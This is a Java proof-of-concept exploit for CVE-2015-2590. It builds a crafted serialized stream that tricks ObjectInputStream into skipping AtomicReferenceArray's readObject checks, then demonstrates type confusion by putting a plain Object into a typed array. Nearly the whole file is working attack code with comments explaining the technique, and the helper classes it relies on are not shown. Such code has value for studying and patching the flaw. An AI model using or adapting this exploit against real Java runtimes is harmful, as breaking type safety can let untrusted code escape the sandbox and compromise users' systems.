package poc.cve_2015_2590;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.ObjectInputStream;
import java.io.ObjectStreamClass;
import java.io.ObjectStreamConstants;
import java.util.concurrent.atomic.AtomicReferenceArray;

public class Main {
	
	public static AtomicReferenceArray< Object > ARA;
	public static Main[ ] ARR = new Main[ 1 ];
	
	public static byte[ ] createStream( ) throws IOException {
		/*
		 * This vulnerability exists within the readSerialData method of
		 *  ObjectInputStream and allows you to bypass calls to readObject
		 *  such as the one in AtomicReferenceArray.
		 * 
		 * While deserializing objects, ObjectInputStream starts with the parent class
		 * 	and works it's way down. If a parent class causes a ClassNotFoundException,
		 * 	ObjectInputStream no longer calls the readObject method and reverts to
		 * 	default deserialization.
		 * 
		 * Unfortunately there are no serializable parent classes of AtomicReferenceArray.
		 * 	We instead use a fake class whose members get deserialized before AtomicReferenceArray's.
		 * 
		 * Also unfortunately since this isn't a true parent class, any ClassNotFoundExceptions
		 * 	generated are not propagated and have no effect. We instead reset the internal state
		 * 	of the stream by reading in an IOException. We then overwrite the internal state
		 * 	with ClassNotFoundExceptions.
		 * 
		 * This tricks ObjectInputStream into thinking a parent class has thrown a ClassNotFoundException
		 * 	and reverts the default deserialization of all remaining objects.
		 */
		
		final ObjectStreamClass StreamHelper_OSC = ObjectStreamClass.lookup( StreamHelper.class );
		final ObjectStreamClass AtomicReferenceArray_OSC = ObjectStreamClass.lookup( AtomicReferenceArray.class );
		
		final ObjectStreamClass[ ] StreamHelper_OSCS = {
				StreamHelper_OSC
		};
		// We add a fake parent class ( StreamHelper ) to AtomicReferenceArray
		//  This allows us to deserialize an object during the deserialization
		//  of AtomicReferenceArray but before it's readObject method is called.
		final ObjectStreamClass[ ] AtomicReferenceArray_OSCS = {
				AtomicReferenceArray_OSC,
				StreamHelper_OSC
		};
		
		OOS oos = new OOS( );
		
		Object ARA_MARKER = new Object( );
		{
			// Start AtomicReferenceArray serialized data.
			oos.startObject( ARA_MARKER, AtomicReferenceArray_OSCS );
			{
				// Parent object data to chain to a readObject call
				//  in a class we control.
				oos.startObject( null, StreamHelper_OSCS );
				
				// Handle to recover the deserialized AtomicReferenceArray object
				oos.writeHandle( ARA_MARKER );
				
				// Reset internal stream state
				oos.writeByte( ObjectStreamConstants.TC_EXCEPTION );
				oos.writeNull( );
				oos.cleanHandles( );
				
				// Overwrite all internal handle state with exceptions
				for( int i = 0; i < StreamHelper.NUM_CHILDREN; i++ ) {
					oos.startObject( null, StreamHelper_OSCS );
				}
				
			}
			// The above parent class data puts the internal state of the AtomicReferenceArray
			// 	into an invalid state where it believes that a parent class of it has thrown
			//  a ClassNotFoundException. This prevents a call to AtomicReferenceArray's
			//  readObject method. Now we just deserialize an array of our choice.
			//
			// In this case we use a helper class to make writing the stream easier. It uses
			//  a readReplace method to return the array we want.
			{
				oos.startObject( null, StreamHelper_OSCS );
			}
		}
		oos.close( );
		
		return oos.toByteArray( );
	}
	
	public static void main( String[ ] args ) throws Throwable {
		byte[ ] stream = Main.createStream( );
		
		ObjectInputStream ois = new ObjectInputStream( new ByteArrayInputStream( stream ) );
		try {
			ois.readObject( );
		} catch( Throwable t ) { }
		
		Main.ARA.set( 0, new Object( ) );
		System.out.println( Main.ARR[ 0 ].getClass( ) );
	}
	
}
